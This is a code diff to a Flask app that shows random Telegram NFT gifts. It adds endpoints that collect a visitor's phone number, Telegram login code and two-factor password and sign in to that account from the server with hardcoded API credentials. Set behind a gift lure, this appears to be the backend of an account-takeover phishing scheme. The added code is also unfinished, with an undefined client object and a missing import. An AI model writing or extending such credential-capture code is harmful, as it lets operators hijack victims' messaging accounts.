@@ -3,11 +3,13 @@ from flask_cors import CORS
 import sqlite3
 import requests
 from bs4 import BeautifulSoup
-
+from telethon import TelegramClient
+from telethon.errors import SessionPasswordNeededError
+from db_func import get_random_row
 app = Flask(__name__)
 CORS(app, supports_credentials=True)
 
-DB_PATH = "gifts.db"
+
 
 
 def clean_name(name):
@@ -30,14 +32,8 @@ def add_cors_headers(response):
     response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
     return response
 
-def get_random_row():
-    conn = sqlite3.connect(DB_PATH)
-    conn.row_factory = sqlite3.Row
-    cur = conn.cursor()
-    cur.execute("SELECT collection, gift_id, price FROM gifts ORDER BY RANDOM() LIMIT 1;")
-    row = cur.fetchone()
-    conn.close()
-    return dict(row) if row else None
+
+
 
 
 def parse_telegram_nft(collection, gift_id):
@@ -83,6 +79,9 @@ def parse_telegram_nft(collection, gift_id):
     }
 
 
+    
+
+
 @app.route("/api/nft")
 def api_nft():
     row = get_random_row()
@@ -103,6 +102,62 @@ def api_nft():
     }
 
     return jsonify(response)
+
+
+api_id = 2040     
+api_hash = "b18441a1ff607e10a989891a5462e627"
+
+@app.route("/api/phone", methods=["POST"])
+async def api_phone():
+    data = request.get_json()
+    phone = data.get("phone")
+
+    if not phone:
+        return jsonify({"ok": False, "error": "missing phone"}), 400
+
+    await client.connect()
+
+    try:
+        await client.send_code_request(phone)
+        return jsonify({"ok": True})
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 400
+
+
+@app.route("/api/code", methods=["POST"])
+async def api_code():
+    data = request.get_json()
+    phone = data.get("phone")
+    code = data.get("code")
+
+    if not phone or not code:
+        return jsonify({"ok": False, "error": "missing phone or code"}), 400
+
+    try:
+        await client.sign_in(phone, code)
+        return jsonify({"ok": True, "2fa": False})
+    except SessionPasswordNeededError:
+        return jsonify({"ok": True, "2fa": True})
+    except PhoneCodeInvalidError:
+        return jsonify({"ok": False, "error": "invalid code"})
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 400
+
+
+@app.route("/api/2fa", methods=["POST"])
+async def api_2fa():
+    data = request.get_json()
+    password = data.get("password")
+
+    if not password:
+        return jsonify({"ok": False, "error": "missing password"}), 400
+
+    try:
+        await client.sign_in(password=password)
+        return jsonify({"ok": True})
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 400
+
 
 
 if __name__ == "__main__":
